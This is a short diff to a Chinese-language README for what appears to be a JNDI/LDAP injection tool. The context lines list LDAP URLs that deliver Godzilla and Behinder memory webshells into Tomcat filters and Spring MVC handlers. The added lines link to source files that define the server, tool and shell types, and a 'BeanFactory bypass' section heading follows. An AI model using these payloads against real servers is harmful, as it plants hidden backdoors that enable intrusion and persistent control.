@@ -140,9 +140,15 @@ ldap://127.0.0.1:1389/Basic/MemShell/Tomcat/Godzilla/Filter
 ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/Interceptor
 # Spring Web MVC Behinder Controller
 ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
-
-# 更多内存马类型参考 MemShellParty README
 ```
+
+其中 server、tool 和 type 参考以下代码
+
+[https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ServerType.java](https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ServerType.java)
+
+[https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ShellTool.java](https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ShellTool.java)
+
+[https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ShellType.java](https://github.com/ReaJason/MemShellParty/blob/master/generator/src/main/java/com/reajason/javaweb/memshell/ShellType.java)
 
 ## BeanFactory 绕过
 
